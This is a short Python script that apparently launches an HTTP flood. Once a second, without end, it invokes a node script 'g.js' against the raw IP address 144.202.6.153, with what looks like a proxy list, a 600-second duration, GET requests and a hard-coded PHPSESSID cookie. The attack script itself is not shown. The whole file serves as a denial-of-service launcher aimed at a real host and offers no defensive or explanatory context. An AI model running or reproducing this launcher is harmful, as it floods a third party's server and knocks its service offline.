import schedule
import time
import os
import sys

os.system('node g.js http://144.202.6.153 http.txt 600 GET PHPSESSID:7m9g35b7srvg5d7e595cb6ss7a')

def job():
    os.system('node g.js http://144.202.6.153 http.txt 600 GET PHPSESSID:7m9g35b7srvg5d7e595cb6ss7a')
    
schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)